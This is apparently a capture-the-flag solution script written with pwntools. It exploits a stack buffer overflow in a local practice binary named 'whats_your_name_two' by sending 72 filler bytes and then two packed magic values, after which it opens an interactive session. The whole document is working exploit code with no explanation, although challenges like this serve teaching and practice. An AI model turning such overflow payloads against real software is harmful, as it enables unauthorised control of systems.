from pwn import *

io = process("./whats_your_name_two")
payload = b'A'*72
payload += p32(0x534b544e)
payload += p32(0x5445454c)
payload += b'\n'
io.recvuntil(b"name ? ")
io.send(payload)
io.interactive()
